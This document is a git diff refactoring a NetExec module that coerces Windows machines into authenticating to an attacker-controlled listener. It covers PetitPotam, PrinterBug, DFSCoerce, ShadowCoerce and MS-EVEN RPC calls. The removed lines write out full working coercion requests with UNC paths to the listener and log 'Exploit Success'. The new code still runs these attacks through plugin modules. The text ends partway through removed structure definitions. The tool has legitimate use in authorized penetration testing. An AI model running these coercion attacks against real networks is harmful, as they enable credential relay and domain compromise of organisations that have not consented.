@@ -1,10 +1,14 @@
-from impacket import uuid
-from impacket.dcerpc.v5 import transport, rprn, even, epm
-from impacket.dcerpc.v5.ndr import NDRCALL, NDRSTRUCT, NDRPOINTER, NDRUniConformantArray, NDRPOINTERNULL
-from impacket.dcerpc.v5.dtypes import LPBYTE, USHORT, LPWSTR, DWORD, ULONG, NULL, WSTR, LONG, BOOL, PCHAR, RPC_SID
-from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_GSS_NEGOTIATE, RPC_C_AUTHN_LEVEL_PKT_PRIVACY
+import nxc
 
-from impacket.uuid import uuidtup_to_bin
+from os.path import dirname
+from os.path import join as path_join
+
+from nxc.paths import NXC_PATH
+from nxc.loaders.moduleloader import ModuleLoader
+
+from impacket.uuid import uuidtup_to_bin, bin_to_string
+from impacket.dcerpc.v5 import transport, rprn, even, epm
+from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_GSS_NEGOTIATE, RPC_C_AUTHN_LEVEL_PKT_PRIVACY
 
 
 class NXCModule:
@@ -20,6 +24,12 @@ class NXCModule:
         self.listener = None
         self.always_continue = None
         self.method = "all"
+
+        self.method_paths = [
+            path_join(dirname(nxc.__file__), "modules", "coerce_plus_method"),
+            path_join(NXC_PATH, "modules", "coerce_plus_method"),
+        ]
+        self.method_modules = ModuleLoader.load_all_modules_from_subdirs(self.method_paths)
 
     def options(self, context, module_options):
         """
@@ -47,7 +57,7 @@ class NXCModule:
             runmethod = True
             """DFSCOERCE START"""
             try:
-                dfscocerceclass = DFSCoerceTrigger(context)
+                dfscocerceclass = DFSCoerceTrigger(context, self.method_modules)
                 target = connection.host if not connection.kerberos else connection.hostname + "." + connection.domain
                 dfscocerceconnect = dfscocerceclass.connect(
                     username=connection.username,
@@ -78,7 +88,7 @@ class NXCModule:
             runmethod = True
             """ ShadowCoerce START """
             try:
-                shadowcocerceclass = ShadowCoerceTrigger(context)
+                shadowcocerceclass = ShadowCoerceTrigger(context, self.method_modules)
                 target = connection.host if not connection.kerberos else connection.hostname + "." + connection.domain
                 shadowcocerceconnect = shadowcocerceclass.connect(
                     username=connection.username,
@@ -113,7 +123,7 @@ class NXCModule:
             for pipe in pipes:
                 context.log.debug(f"Trying to connect to {pipe} pipe")
                 try:
-                    petitpotamclass = PetitPotamtTrigger(context)
+                    petitpotamclass = PetitPotamtTrigger(context, self.method_modules)
                     target = connection.host if not connection.kerberos else connection.hostname + "." + connection.domain
                     petitpotamconnect = petitpotamclass.connect(
                         username=connection.username,
@@ -150,7 +160,7 @@ class NXCModule:
             pipes = ["spoolss", "[dcerpc]"]
             for pipe in pipes:
                 try:
-                    printerbugclass = PrinterBugTrigger(context)
+                    printerbugclass = PrinterBugTrigger(context, self.method_modules)
                     target = connection.host if not connection.kerberos else connection.hostname + "." + connection.domain
                     printerbugconnect = printerbugclass.connect(
                         username=connection.username,
@@ -183,7 +193,7 @@ class NXCModule:
             runmethod = True
             """ MSEVEN START """
             try:
-                msevenclass = MSEvenTrigger(context)
+                msevenclass = MSEvenTrigger(context, self.method_modules)
                 target = connection.host if not connection.kerberos else connection.hostname + "." + connection.domain
                 msevenconnect = msevenclass.connect(
                     username=connection.username,
@@ -213,10 +223,10 @@ class NXCModule:
             context.log.error("Invalid method, please check the method name.")
             return
 
-
 class ShadowCoerceTrigger:
-    def __init__(self, context):
+    def __init__(self, context, methods):
         self.context = context
+        self.methods = methods
 
     def connect(self, username, password, domain, lmhash, nthash, aesKey, target, doKerberos, dcHost, pipe):
         binding_params = {
@@ -259,81 +269,31 @@ class ShadowCoerceTrigger:
         return dce
 
     def exploit(self, dce, listener, always_continue, pipe):
-        self.context.log.debug("Sending IsPathShadowCopied!")
-        try:
-            request = IsPathShadowCopied()
-            request["ShareName"] = f"{listener}\x00"
-            dce.request(request)
-        except Exception as e:
-            if str(e).find("rpc_s_access_denied") >= 0:
-                self.context.log.debug("IsPathShadowCopied Success")
-                self.context.log.highlight(f"Exploit Success, {pipe}\\IsPathShadowCopied")
-                if not always_continue:
-                    return True
-            else:
-                self.context.log.debug(f"Something went wrong, check error status => {e!s}")
+        for method in self.methods:
+            ProtocolName = method.__package__
+            CoerceMethod = method.__name__.split(".")[1]
+            if ProtocolName == "MS_FSRVP":
+                self.context.log.debug(f"Sending {CoerceMethod}!")
+                try:
+                    method.request(dce, listener)
+                except Exception as e:
+                    self.handle_exception(CoerceMethod, pipe, always_continue, e)
 
-        self.context.log.debug("Sending IsPathSupported!")
-        try:
-            request = IsPathSupported()
-            request["ShareName"] = f"{listener}\x00"
-            dce.request(request)
-        except Exception as e:
-            if str(e).find("rpc_s_access_denied") >= 0:
-                self.context.log.debug("IsPathSupported Success")
-                self.context.log.highlight(f"Exploit Success, {pipe}\\IsPathSupported")
-                if not always_continue:
-                    return True
-            else:
-                self.context.log.debug(f"Something went wrong, check error status => {e!s}")
-
-
-class NetrDfsAddStdRootForcedResponse(NDRCALL):
-    structure = ()
-
-
-class NetrDfsAddStdRootForced(NDRCALL):
-    opnum = 15
-    structure = (
-        ("ServerName", WSTR),  # Type: WCHAR *
-        ("RootShare", WSTR),  # Type: WCHAR *
-        ("Comment", WSTR),  # Type: WCHAR *
-        ("Share", WSTR),  # Type: WCHAR *
-    )
-
-
-class NetrDfsRemoveRootTargetResponse(NDRCALL):
-    structure = ()
-
-
-class NetrDfsRemoveRootTarget(NDRCALL):
-    opnum = 24
-    structure = (
-        ("pDfsPath", LPWSTR),  # Type: LPWSTR
-        ("pTargetPath", LPWSTR),  # Type: LPWSTR
-        ("Flags", ULONG),  # Type: ULONG
-    )
-
-
-class NetrDfsAddRootTargetResponse(NDRCALL):
-    structure = ()
-
-
-class NetrDfsAddRootTarget(NDRCALL):
-    opnum = 23
-    structure = (
-        ("pDfsPath", LPWSTR),  # Type: LPWSTR
-        ("pTargetPath", LPWSTR),  # Type: LPWSTR
-        ("MajorVersion", ULONG),  # Type: ULONG
-        ("pComment", LPWSTR),  # Type: LPWSTR
-        ("NewNamespace", BOOL),  # Type: BOOLEAN
-        ("Flags", ULONG),  # Type: ULONG
-    )
-
+    def handle_exception(self, CoerceMethod, pipe, always_continue, e):
+        if str(e).find("rpc_s_access_denied") >= 0 or str(e).find("ERROR_BAD_NETPATH") >= 0 or str(e).find("RPC_S_INVALID_NET_ADDR") >= 0:
+            self.context.log.debug(f"{CoerceMethod} Success")
+            self.context.log.highlight(f"Exploit Success, {pipe}\\{CoerceMethod}")
+            if not always_continue:
+                return True
+        elif str(e).find("ERROR_NOT_SUPPORTED") >= 0:
+            self.context.log.debug("Not Vulnerable")
+        else:
+            self.context.log.debug(f"Something went wrong, check error status => {e!s}")
 
 class DFSCoerceTrigger:
-    def __init__(self, context):
+    def __init__(self, context, methods):
         self.context = context
+        self.methods = methods
 
     def connect(self, username, password, domain, lmhash, nthash, aesKey, target, doKerberos, dcHost, pipe):
         binding_params = {
@@ -377,123 +337,20 @@ class DFSCoerceTrigger:
         return dce
 
     def exploit(self, dce, listener, always_continue, pipe):
-        self.context.log.debug("Sending NetrDfsAddStdRootForced!")
-        try:
-            request = NetrDfsAddStdRootForced()
-            """ NET_API_STATUS NetrDfsAddStdRootForced(
-                    [in, string] WCHAR* ServerName,
-                    [in, string] WCHAR* RootShare,
-                    [in, string] WCHAR* Comment,
-                    [in, string] WCHAR* Share
-                );
-            """
-            request["ServerName"] = f"{listener}\x00"
-            request["RootShare"] = "test\x00"
-            request["Comment"] = "lodos\x00"
-            request["Share"] = "x:\\lodos2005\x00"
+        for method in self.methods:
+            ProtocolName = method.__package__
+            CoerceMethod = method.__name__.split(".")[1]
+            if ProtocolName == "MS_DFSNM":
+                self.context.log.debug(f"Sending {CoerceMethod}!")
+                try:
+                    method.request(dce, listener)
+                except Exception as e:
+                    self.handle_exception(CoerceMethod, pipe, always_continue, e)
 
-            dce.request(request)
-        except Exception as e:
-            self.handle_exception(request.__class__.__name__, always_continue, pipe, e)
-
-        self.context.log.debug("Sending NetrDfsAddRootTarget!")
-        try:
-            request = NetrDfsAddRootTarget()
-            """    NET_API_STATUS NetrDfsAddRootTarget(
-                    [in, unique, string] LPWSTR pDfsPath,
-                    [in, unique, string] LPWSTR pTargetPath,
-                    [in] ULONG MajorVersion,
-                    [in, unique, string] LPWSTR pComment,
-                    [in] BOOLEAN NewNamespace,
-                    [in] ULONG Flags
-                );
-            """
-            request["pDfsPath"] = f"\\\\{listener}\\a\x00"
-            request["pTargetPath"] = NULL
-            request["MajorVersion"] = 0
-            request["pComment"] = "lodos\x00"
-            request["NewNamespace"] = 0
-            request["Flags"] = 0
-            dce.request(request)
-            self.context.log.debug("NetrDfsAddRootTarget Success")
-            return True
-        except Exception as e:
-            self.handle_exception(request.__class__.__name__, always_continue, pipe, e)
-
-        # Private exploit
-        self.context.log.debug("Sending NetrDfsRemoveRootTarget!")
-        try:
-            request = NetrDfsRemoveRootTarget()
-            """    NET_API_STATUS NetrDfsRemoveRootTarget(
-                    [in, unique, string] LPWSTR pDfsPath,
-                    [in, unique, string] LPWSTR pTargetPath,
-                    [in] ULONG Flags
-                );
-            """
-            request["pDfsPath"] = f"\\\\{listener}\\a\x00"
-            request["pTargetPath"] = NULL
-            request["Flags"] = 0
-            dce.request(request)
-            self.context.log.debug("NetrDfsRemoveRootTarget Success")
-            return True
-        except Exception as e:
-            self.handle_exception(request.__class__.__name__, always_continue, pipe, e)
-
-        self.context.log.debug("Sending NetrDfsManagerInitialize!")
-        try:
-            request = NetrDfsManagerInitialize()
-            """   NET_API_STATUS NetrDfsManagerInitialize(
-                    [in, string] WCHAR* ServerName,
-                    [in] DWORD Flags
-                    );
-            """
-            request["ServerName"] = f"{listener}\x00"
-            request["Flags"] = 0  # Flags: This parameter MUST be zero.
-
-            dce.request(request)
-        except Exception as e:
-            self.handle_exception(request.__class__.__name__, always_continue, pipe, e)
-
-        self.context.log.debug("Sending NetrDfsManagerInitialize!")
-        try:
-            request = NetrDfsManagerInitialize()
-            """   NET_API_STATUS NetrDfsManagerInitialize(
-                    [in, string] WCHAR* ServerName,
-                    [in] DWORD Flags
-                    );
-            """
-            request["ServerName"] = f"{listener}\x00"
-            request["Flags"] = 0  # Flags: This parameter MUST be zero.
-
-            dce.request(request)
-        except Exception as e:
-            self.handle_exception(request.__class__.__name__, always_continue, pipe, e)
-
-        self.context.log.debug("Sending NetrDfsAddStdRoot!")
-        try:
-            request = NetrDfsAddStdRoot()
-            request["ServerName"] = f"{listener}\x00"
-            request["RootShare"] = "test\x00"
-            request["Comment"] = "lodos\x00"
-            request["ApiFlags"] = 0
-            dce.request(request)
-        except Exception as e:
-            self.handle_exception(request.__class__.__name__, always_continue, pipe, e)
-
-        self.context.log.debug("Sending NetrDfsRemoveStdRoot!")
-        try:
-            request = NetrDfsRemoveStdRoot()
-            request["ServerName"] = f"{listener}\x00"
-            request["RootShare"] = "test\x00"
-            request["ApiFlags"] = 0
-            dce.request(request)
-        except Exception as e:
-            self.handle_exception(request.__class__.__name__, always_continue, pipe, e)
-
-    def handle_exception(self, method_name, always_continue, pipe, e):
+    def handle_exception(self, CoerceMethod, pipe, always_continue, e):
         if str(e).find("rpc_s_access_denied") >= 0 or str(e).find("ERROR_BAD_NETPATH") >= 0 or str(e).find("RPC_S_INVALID_NET_ADDR") >= 0:
-            self.context.log.debug(f"{method_name} Success")
-            self.context.log.highlight(f"Exploit Success, {pipe}\\{method_name}")
+            self.context.log.debug(f"{CoerceMethod} Success")
+            self.context.log.highlight(f"Exploit Success, {pipe}\\{CoerceMethod}")
             if not always_continue:
                 return True
         elif str(e).find("ERROR_NOT_SUPPORTED") >= 0:
@@ -501,10 +358,10 @@ class DFSCoerceTrigger:
         else:
             self.context.log.debug(f"Something went wrong, check error status => {e!s}")
 
-
 class PetitPotamtTrigger:
-    def __init__(self, context):
+    def __init__(self, context, methods):
         self.context = context
+        self.methods = methods
 
     def connect(self, username, password, domain, lmhash, nthash, aesKey, target, doKerberos, dcHost, pipe):
         binding_params = {
@@ -566,203 +423,39 @@ class PetitPotamtTrigger:
         return dce
 
     def exploit(self, dce, listener, always_continue, pipe):
-        self.context.log.debug("Sending EfsRpcAddUsersToFile!")
-        try:
-            request = EfsRpcAddUsersToFile()
-            request["FileName"] = f"\\\\{listener}\\test\\Settings.ini\x00"
-            dce.request(request)
-        except Exception as e:
-            if str(e).find("ERROR_BAD_NETPATH") >= 0:
-                self.context.log.debug("EfsRpcAddUsersToFile Success")
-                self.context.log.highlight(f"Exploit Success, {pipe}\\EfsRpcAddUsersToFile")
-                if not always_continue:
-                    return True
-            elif str(e).find("rpc_s_access_denied") >= 0 or str(e).find("ERROR_INVALID_NAME") >= 0:
-                self.context.log.debug("Not Vulnerable")
-            else:
-                self.context.log.debug(f"Something went wrong, check error status => {e!s}")
+        for method in self.methods:
+            ProtocolName = method.__package__
+            CoerceMethod = method.__name__.split(".")[1]
+            if ProtocolName == "MS_EFSR":
+                self.context.log.debug(f"Sending {CoerceMethod}!")
+                try:
+                    method.request(dce, listener)
+                except Exception as e:
+                    self.handle_exception(CoerceMethod, pipe, always_continue, e)
 
-        self.context.log.debug("Sending EfsRpcAddUsersToFileEx!")
-        try:
-            request = EfsRpcAddUsersToFileEx()
-            request["dwFlags"] = 0x00000002
-            request["FileName"] = f"\\\\{listener}\\test\\Settings.ini\x00"
-            dce.request(request)
-        except Exception as e:
-            if str(e).find("ERROR_BAD_NETPATH") >= 0:
-                self.context.log.debug("EfsRpcAddUsersToFileEx Success")
-                self.context.log.highlight(f"Exploit Success, {pipe}\\EfsRpcAddUsersToFileEx")
-                if not always_continue:
-                    return True
-            elif str(e).find("rpc_s_access_denied") >= 0 or str(e).find("ERROR_INVALID_NAME") >= 0:
-                self.context.log.debug("Not Vulnerable")
-            else:
-                self.context.log.debug(f"Something went wrong, check error status => {e!s}")
-
-        self.context.log.debug("Sending EfsRpcDecryptFileSrv!")
-        try:
-            request = EfsRpcDecryptFileSrv()
-            request["OpenFlag"] = 0
-            request["FileName"] = f"\\\\{listener}\\test\\Settings.ini\x00"
-            dce.request(request)
-        except Exception as e:
-            if str(e).find("ERROR_BAD_NETPATH") >= 0:
-                self.context.log.debug("EfsRpcDecryptFileSrv Success")
-                self.context.log.highlight(f"Exploit Success, {pipe}\\EfsRpcDecryptFileSrv")
-                if not always_continue:
-                    return True
-            elif str(e).find("rpc_s_access_denied") >= 0 or str(e).find("ERROR_INVALID_NAME") >= 0:
-                self.context.log.debug("Not Vulnerable")
-            else:
-                self.context.log.debug(f"Something went wrong, check error status => {e!s}")
-
-        self.context.log.debug("Sending EfsRpcDuplicateEncryptionInfoFile!")
-        try:
-            request = EfsRpcDuplicateEncryptionInfoFile()
-            request["SrcFileName"] = f"\\\\{listener}\\test\\Settings.ini\x00"
-            request["DestFileName"] = f"\\\\{listener}\\test\\Settings.ini\x00"
-            request["dwCreationDisposition"] = 0
-            request["dwAttributes"] = 0
-            request["RelativeSD"] = EFS_RPC_BLOB()
-            request["bInheritHandle"] = 0
-            dce.request(request)
-        except Exception as e:
-            if str(e).find("ERROR_BAD_NETPATH") >= 0:
-                self.context.log.debug("EfsRpcDuplicateEncryptionInfoFile Success")
-                self.context.log.highlight(f"Exploit Success, {pipe}\\EfsRpcDuplicateEncryptionInfoFile")
-                if not always_continue:
-                    return True
-            elif str(e).find("rpc_s_access_denied") >= 0 or str(e).find("ERROR_INVALID_NAME") >= 0:
-                self.context.log.debug("Not Vulnerable")
-            else:
-                self.context.log.debug(f"Something went wrong, check error status => {e!s}")
-
-        self.context.log.debug("Sending EfsRpcEncryptFileSrv!")
-        try:
-            request = EfsRpcEncryptFileSrv()
-            request["FileName"] = f"\\\\{listener}\\test\\Settings.ini\x00"
-            dce.request(request)
-        except Exception as e:
-            if str(e).find("ERROR_BAD_NETPATH") >= 0:
-                self.context.log.debug("EfsRpcEncryptFileSrv Success")
-                self.context.log.highlight(f"Exploit Success, {pipe}\\EfsRpcEncryptFileSrv")
-                if not always_continue:
-                    return True
-            elif str(e).find("rpc_s_access_denied") >= 0 or str(e).find("ERROR_INVALID_NAME") >= 0:
-                self.context.log.debug("Not Vulnerable")
-            else:
-                self.context.log.debug(f"Something went wrong, check error status => {e!s}")
-
-        self.context.log.debug("Sending EfsRpcEncryptFileSrv!")
-        try:
-            request = EfsRpcEncryptFileSrv()
-            request["FileName"] = f"\\\\{listener}\\test\\Settings.ini\x00"
-            dce.request(request)
-        except Exception as e:
-            if str(e).find("ERROR_BAD_NETPATH") >= 0:
-                self.context.log.debug("EfsRpcEncryptFileSrv Success")
-                self.context.log.highlight(f"Exploit Success, {pipe}\\EfsRpcEncryptFileSrv")
-                if not always_continue:
-                    return True
-            elif str(e).find("rpc_s_access_denied") >= 0 or str(e).find("ERROR_INVALID_NAME") >= 0:
-                self.context.log.debug("Not Vulnerable")
-            else:
-                self.context.log.debug(f"Something went wrong, check error status => {e!s}")
-
-        self.context.log.debug("Sending EfsRpcFileKeyInfo!")
-        try:
-            request = EfsRpcFileKeyInfo()
-            request["FileName"] = f"\\\\{listener}\\test\\Settings.ini\x00"
-            request["InfoClass"] = 0
-            dce.request(request)
-        except Exception as e:
-            if str(e).find("ERROR_BAD_NETPATH") >= 0:
-                self.context.log.debug("EfsRpcFileKeyInfo Success")
-                self.context.log.highlight(f"Exploit Success, {pipe}\\EfsRpcFileKeyInfo")
-                if not always_continue:
-                    return True
-            elif str(e).find("rpc_s_access_denied") >= 0 or str(e).find("ERROR_INVALID_NAME") >= 0:
-                self.context.log.debug("Not Vulnerable")
-            else:
-                self.context.log.debug(f"Something went wrong, check error status => {e!s}")
-
-        self.context.log.debug("Sending EfsRpcQueryRecoveryAgents!")
-        try:
-            request = EfsRpcQueryRecoveryAgents()
-            request["FileName"] = f"\\\\{listener}\\test\\Settings.ini\x00"
-            dce.request(request)
-        except Exception as e:
-            if str(e).find("ERROR_BAD_NETPATH") >= 0:
-                self.context.log.debug("EfsRpcQueryRecoveryAgents Success")
-                self.context.log.highlight(f"Exploit Success, {pipe}\\EfsRpcQueryRecoveryAgents")
-                if not always_continue:
-                    return True
-            elif str(e).find("rpc_s_access_denied") >= 0 or str(e).find("ERROR_INVALID_NAME") >= 0:
-                self.context.log.debug("Not Vulnerable")
-            else:
-                self.context.log.debug(f"Something went wrong, check error status => {e!s}")
-
-        self.context.log.debug("Sending EfsRpcQueryUsersOnFile!")
-        try:
-            request = EfsRpcQueryUsersOnFile()
-            request["FileName"] = f"\\\\{listener}\\test\\Settings.ini\x00"
-            dce.request(request)
-        except Exception as e:
-            if str(e).find("ERROR_BAD_NETPATH") >= 0:
-                self.context.log.debug("EfsRpcQueryUsersOnFile Success")
-                self.context.log.highlight(f"Exploit Success, {pipe}\\EfsRpcQueryUsersOnFile")
-                if not always_continue:
-                    return True
-            elif str(e).find("rpc_s_access_denied") >= 0 or str(e).find("ERROR_INVALID_NAME") >= 0:
-                self.context.log.debug("Not Vulnerable")
-            else:
-                self.context.log.debug(f"Something went wrong, check error status => {e!s}")
-
-        self.context.log.debug("Sending EfsRpcRemoveUsersFromFile!")
-        try:
-            request = EfsRpcRemoveUsersFromFile()
-            request["FileName"] = f"\\\\{listener}\\test\\Settings.ini\x00"
-            dce.request(request)
-        except Exception as e:
-            if str(e).find("ERROR_BAD_NETPATH") >= 0:
-                self.context.log.debug("EfsRpcRemoveUsersFromFile Success")
-                self.context.log.highlight(f"Exploit Success, {pipe}\\EfsRpcRemoveUsersFromFile")
-                if not always_continue:
-                    return True
-            elif str(e).find("rpc_s_access_denied") >= 0 or str(e).find("ERROR_INVALID_NAME") >= 0:
-                self.context.log.debug("Not Vulnerable")
-            else:
-                self.context.log.debug(f"Something went wrong, check error status => {e!s}")
-
-        self.context.log.debug("Sending EfsRpcOpenFileRaw!")
-        try:
-            request = EfsRpcOpenFileRaw()
-            request["FileName"] = f"\\\\{listener}\\test\\Settings.ini\x00"
-            request["Flags"] = 0
-            dce.request(request)
-        except Exception as e:
-            if str(e).find("ERROR_BAD_NETPATH") >= 0:
-                self.context.log.debug("EfsRpcOpenFileRaw Success")
-                self.context.log.highlight(f"Exploit Success, {pipe}\\EfsRpcOpenFileRaw")
-                if not always_continue:
-                    return True
-            elif str(e).find("rpc_s_access_denied") >= 0 or str(e).find("ERROR_INVALID_NAME") >= 0:
-                self.context.log.debug("Not Vulnerable")
-            else:
-                self.context.log.debug(f"Something went wrong, check error status => {e!s}")
-        return False
+    def handle_exception(self, CoerceMethod, pipe, always_continue, e):
+        if str(e).find("rpc_s_access_denied") >= 0 or str(e).find("ERROR_BAD_NETPATH") >= 0 or str(e).find("RPC_S_INVALID_NET_ADDR") >= 0:
+            self.context.log.debug(f"{CoerceMethod} Success")
+            self.context.log.highlight(f"Exploit Success, {pipe}\\{CoerceMethod}")
+            if not always_continue:
+                return True
+        elif str(e).find("ERROR_NOT_SUPPORTED") >= 0:
+            self.context.log.debug("Not Vulnerable")
+        else:
+            self.context.log.debug(f"Something went wrong, check error status => {e!s}")
 
 
 class PrinterBugTrigger:
-    def __init__(self, context):
+    def __init__(self, context, methods):
         self.context = context
+        self.methods = methods
 
     def get_dynamic_endpoint(self, interface: bytes, target: str, timeout: int = 5) -> str:
         string_binding = rf"ncacn_ip_tcp:{target}[135]"
         rpctransport = transport.DCERPCTransportFactory(string_binding)
         rpctransport.set_connect_timeout(timeout)
         dce = rpctransport.get_dce_rpc()
-        self.context.log.debug(f"Trying to resolve dynamic endpoint {uuid.bin_to_string(interface)!r}")
+        self.context.log.debug(f"Trying to resolve dynamic endpoint {bin_to_string(interface)!r}")
         try:
             dce.connect()
         except Exception as e:
@@ -771,11 +464,11 @@ class PrinterBugTrigger:
         try:
             endpoint = epm.hept_map(target, interface, protocol="ncacn_ip_tcp", dce=dce)
             self.context.log.debug(
-                f"Resolved dynamic endpoint {uuid.bin_to_string(interface)!r} to {endpoint!r}"
+                f"Resolved dynamic endpoint {bin_to_string(interface)!r} to {endpoint!r}"
             )
             return endpoint
         except Exception as e:
-            self.context.log.debug(f"Failed to resolve dynamic endpoint {uuid.bin_to_string(interface)!r}")
+            self.context.log.debug(f"Failed to resolve dynamic endpoint {bin_to_string(interface)!r}")
             raise e
 
     def connect(self, username, password, domain, lmhash, nthash, aesKey, target, doKerberos, dcHost, pipe):
@@ -828,76 +521,31 @@ class PrinterBugTrigger:
         return dce
 
     def exploit(self, dce, listener, target, always_continue, pipe):
-        try:
-            resp = rprn.hRpcOpenPrinter(dce, f"\\\\{target}\x00")
-        except Exception as e:
-            if str(e).find("Broken pipe") >= 0:
-                # The connection timed-out. Let's try to bring it back next round
-                self.context.log.debug("Connection failed - skipping host!")
-                return None
-            elif str(e).upper().find("ACCESS_DENIED"):
-                # We're not admin, bye
-                self.context.log.debug("Access denied - RPC call was denied")
-                return None
-        self.context.log.debug("Got Handle")
-        self.context.log.debug("Sending RpcRemoteFindFirstPrinterChangeNotificationEx!")
+        for method in self.methods:
+            ProtocolName = method.__package__
+            CoerceMethod = method.__name__.split(".")[1]
+            if ProtocolName == "MS_RPRN":
+                self.context.log.debug(f"Sending {CoerceMethod}!")
+                try:
+                    method.request(dce, listener, target)
+                except Exception as e:
+                    self.handle_exception(CoerceMethod, pipe, always_continue, e)
 
-        try:
-            # https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/eb66b221-1c1f-4249-b8bc-c5befec2314d
-            request = rprn.RpcRemoteFindFirstPrinterChangeNotificationEx()
-            request["hPrinter"] = resp["pHandle"]
-            request["fdwFlags"] = rprn.PRINTER_CHANGE_ADD_JOB
-            request["pszLocalMachine"] = f"\\\\{listener}\x00"
-            request["fdwOptions"] = 0x00000000
-            request["dwPrinterLocal"] = 0
-            dce.request(request)
-        except Exception as e:
-            if str(e).find("rpc_s_access_denied") >= 0 or str(e).find("RPC_S_SERVER_UNAVAILABLE") >= 0:
-                self.context.log.debug("RpcRemoteFindFirstPrinterChangeNotificationEx Success")
-                self.context.log.highlight(f"Exploit Success, {pipe}\\RpcRemoteFindFirstPrinterChangeNotificationEx")
-                if not always_continue:
-                    return True
-            else:
-                self.context.log.debug(f"Something went wrong, check error status => {e!s}")
-
-        self.context.log.debug("Sending RpcRemoteFindFirstPrinterChangeNotification!")
-        try:
-            resp = rprn.hRpcOpenPrinter(dce, f"\\\\{target}\x00")
-        except Exception as e:
-            if str(e).find("Broken pipe") >= 0:
-                # The connection timed-out. Let's try to bring it back next round
-                self.context.log.debug("Connection failed - skipping host!")
-                return None
-            elif str(e).upper().find("ACCESS_DENIED"):
-                # We're not admin, bye
-                self.context.log.debug("Access denied - RPC call was denied")
-                return None
-
-        self.context.log.debug("Got Handle")
-        try:
-            # https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/eb66b221-1c1f-4249-b8bc-c5befec2314d
-            request = RpcRemoteFindFirstPrinterChangeNotification()
-            request["hPrinter"] = resp["pHandle"]
-            request["fdwFlags"] = rprn.PRINTER_CHANGE_ADD_JOB
-            request["pszLocalMachine"] = f"\\\\{listener}\x00"
-            request["fdwOptions"] = 0x00000000
-            request["dwPrinterLocal"] = 0
-            request["cbBuffer"] = NULL
-            request["pBuffer"] = NULL
-            dce.request(request)
-        except Exception as e:
-            if str(e).find("rpc_s_access_denied") >= 0 or str(e).find("RPC_S_SERVER_UNAVAILABLE") >= 0:
-                self.context.log.debug("RpcRemoteFindFirstPrinterChangeNotification Success")
-                self.context.log.highlight(f"Exploit Success, {pipe}\\RpcRemoteFindFirstPrinterChangeNotification")
-                if not always_continue:
-                    return True
-            else:
-                self.context.log.debug(f"Something went wrong, check error status => {e!s}")
-
+    def handle_exception(self, CoerceMethod, pipe, always_continue, e):
+        if str(e).find("rpc_s_access_denied") >= 0 or str(e).find("ERROR_BAD_NETPATH") >= 0 or str(e).find("RPC_S_INVALID_NET_ADDR") >= 0:
+            self.context.log.debug(f"{CoerceMethod} Success")
+            self.context.log.highlight(f"Exploit Success, {pipe}\\{CoerceMethod}")
+            if not always_continue:
+                return True
+        elif str(e).find("ERROR_NOT_SUPPORTED") >= 0:
+            self.context.log.debug("Not Vulnerable")
+        else:
+            self.context.log.debug(f"Something went wrong, check error status => {e!s}")
 
 class MSEvenTrigger:
-    def __init__(self, context):
+    def __init__(self, context, methods):
         self.context = context
+        self.methods = methods
 
     def connect(self, username, password, domain, lmhash, nthash, aesKey, target, doKerberos, dcHost, pipe):
         binding_params = {
@@ -942,342 +590,23 @@ class MSEvenTrigger:
         return dce
 
     def exploit(self, dce, listener, always_continue, pipe):
-        self.context.log.debug("Sending ElfrOpenBELW!")
-        try:
-            request = even.ElfrOpenBELW()
-            request["UNCServerName"] = NULL  # '%s\x00' % listener
-            request["BackupFileName"] = f"\\??\\UNC\\{listener}\\abcdefgh\\aa"
-            request["MajorVersion"] = 1
-            request["MinorVersion"] = 1
-            dce.request(request)
-        except Exception as e:
-            if str(e).find("ERROR_BAD_NETPATH") >= 0 or str(e).find("STATUS_OBJECT_PATH_NOT_FOUND") >= 0 or str(e).find("STATUS_CONNECTION_DISCONNECTED") >= 0:
-                self.context.log.debug("ElfrOpenBELW Success")
-                self.context.log.highlight(f"Exploit Success, {pipe}\\ElfrOpenBELW")
-                if not always_continue:
-                    return True
-            elif str(e).find("abstract_syntax_not_supported") >= 0:  # not vulnerable
-                self.context.log.debug("Not Vulnerable")
-            else:
-                self.context.log.debug(f"Something went wrong, check error status => {e!s}")
+        for method in self.methods:
+            ProtocolName = method.__package__
+            CoerceMethod = method.__name__.split(".")[1]
+            if ProtocolName == "MS_EVEN":
+                self.context.log.debug(f"Sending {CoerceMethod}!")
+                try:
+                    method.request(dce, listener)
+                except Exception as e:
+                    self.handle_exception(CoerceMethod, pipe, always_continue, e)
 
-
-class IsPathShadowCopied(NDRCALL):
-    """Structure to make the RPC call to IsPathShadowCopied() in MS-FSRVP Protocol"""
-    opnum = 9
-    structure = (
-        ("ShareName", WSTR),  # Type: LPWSTR
-    )
-
-
-class IsPathShadowCopiedResponse(NDRCALL):
-    """Structure to parse the response of the RPC call to IsPathShadowCopied() in [MS-FSRVP Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-fsrvp/dae107ec-8198-4778-a950-faa7edad125b)"""
-    structure = ()
-
-
-class IsPathSupported(NDRCALL):
-    """Structure to make the RPC call to IsPathSupported() in [MS-FSRVP Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-fsrvp/dae107ec-8198-4778-a950-faa7edad125b)"""
-    opnum = 8
-    structure = (
-        ("ShareName", WSTR),  # Type: LPWSTR
-    )
-
-
-class IsPathSupportedResponse(NDRCALL):
-    """Structure to parse the response of the RPC call to IsPathSupported() in [MS-FSRVP Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-fsrvp/dae107ec-8198-4778-a950-faa7edad125b)"""
-    structure = ()
-
-
-class PRINTER_HANDLE(NDRSTRUCT):
-    structure = (
-        ("Data", '20s=b""'),
-    )
-
-    def getAlignment(self):
-        if self._isNDR64 is True:
-            return 8
+    def handle_exception(self, CoerceMethod, pipe, always_continue, e):
+        if str(e).find("rpc_s_access_denied") >= 0 or str(e).find("ERROR_BAD_NETPATH") >= 0 or str(e).find("RPC_S_INVALID_NET_ADDR") >= 0:
+            self.context.log.debug(f"{CoerceMethod} Success")
+            self.context.log.highlight(f"Exploit Success, {pipe}\\{CoerceMethod}")
+            if not always_continue:
+                return True
+        elif str(e).find("ERROR_NOT_SUPPORTED") >= 0:
+            self.context.log.debug("Not Vulnerable")
         else:
-            return 4
-
-
-class USHORT_ARRAY(NDRUniConformantArray):
-    item = "<H"
-
-
-class PUSHORT_ARRAY(NDRPOINTER):
-    referent = (
-        ("Data", USHORT_ARRAY),
-    )
-
-
